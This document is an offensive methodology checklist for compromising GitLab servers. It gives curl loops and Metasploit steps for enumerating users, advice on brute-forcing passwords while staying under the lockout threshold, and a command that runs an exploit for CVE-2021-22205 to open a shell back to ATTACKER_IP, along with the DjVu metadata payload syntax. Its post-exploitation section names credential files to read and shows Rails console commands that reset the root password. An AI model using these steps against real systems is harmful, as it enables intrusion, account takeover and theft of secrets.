# GitLab Methodology

## 1. Discovery & Fingerprinting

- [ ] `/help` page reveals version (when logged in)
- [ ] `/explore` — public repos (if enabled)
- [ ] `/users/sign_in` — login page
- [ ] Nmap: `nmap -sV -p 80,443,8080 TARGET`

---

## 2. User Enumeration

### API Enumeration
```bash
# By username
curl -s "http://TARGET/api/v4/users?username=root" | jq

# Brute by user ID
for i in $(seq 1 100); do
  curl -s "http://TARGET/api/v4/users/$i" | jq -r '.username // empty' 2>/dev/null
done
```

### Metasploit
```
use auxiliary/scanner/http/gitlab_user_enum
set RHOSTS TARGET
set RPORT 80
run
```

### Dedicated Tools
```bash
# gitlab-enum (InitRoot)
git clone https://github.com/InitRoot/gitlab-enum
python3 gitlab-enum.py -u http://TARGET -w /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

---

## 3. Brute Force

- Versions < 16.6: 10 failed attempts → 10 minute lockout
- Use slow brute or spray to stay under threshold
- Default root password may be set during install

---

## 4. Authenticated RCE — ExifTool (CVE-2021-22205)

> GitLab CE ≤ 13.10.2 — Arbitrary file upload via ExifTool metadata parsing

- [ ] Affects GitLab CE versions 13.10.2 and lower
- [ ] Exploit uploads image with malicious metadata
- [ ] ExifTool processes image → triggers command execution

### Exploit
```bash
# Download exploit
git clone https://github.com/CsEnox/Gitlab-Exiftool-RCE
# OR use gitlab_13_10_2_rce.py

python3 gitlab_13_10_2_rce.py -u http://TARGET -l ATTACKER_IP -p 4443
```

### Manual Exploitation
- [ ] Login to GitLab
- [ ] Create new project or use existing
- [ ] Create issue → attach specially crafted image (DjVu format with embedded command)
- [ ] Image metadata contains: `(metadata "\c${<COMMAND>}")`
- [ ] GitLab's ExifTool processes the upload → RCE

---

## 5. Other Known CVEs

| CVE | Version | Type | Auth |
|-----|---------|------|------|
| CVE-2021-22205 | ≤ 13.10.2 | RCE via ExifTool | Yes |
| CVE-2021-22214 | 10.5 - 13.10.3 | SSRF | No |
| CVE-2023-7028 | 16.1 - 16.7.1 | Account takeover via password reset | No |
| CVE-2023-2825 | 16.0.0 | Path traversal → file read | No |

---

## 6. Post-Exploitation

- [ ] `/etc/gitlab/gitlab-secrets.json` — OTP secret, DB encryption key
- [ ] `/etc/gitlab/gitlab.rb` — main config, SMTP creds, LDAP bind password
- [ ] `/var/opt/gitlab/gitlab-rails/etc/database.yml` — PostgreSQL credentials
- [ ] GitLab Rails console:
```bash
gitlab-rails console
# List all users
User.all.each { |u| puts u.username }
# Reset password
u = User.find_by(username: 'root')
u.password = 'newpassword'
u.password_confirmation = 'newpassword'
u.save!
```
- [ ] Browse repos for secrets: SSH keys, API tokens, `.env` files, CI/CD variables
- [ ] Check CI/CD pipelines for hardcoded secrets

---

## 7. Decision Tree

```
GitLab Found
├── Version? (/help page when logged in)
├── User enum via API (no auth needed)
├── Registration open? → register → enum repos
├── ≤ 13.10.2 → CVE-2021-22205 ExifTool RCE
├── 16.1-16.7.1 → CVE-2023-7028 account takeover
├── Brute force (mind 10-attempt lockout < 16.6)
└── Post-exploit: gitlab-secrets.json, gitlab.rb, repo secrets
```
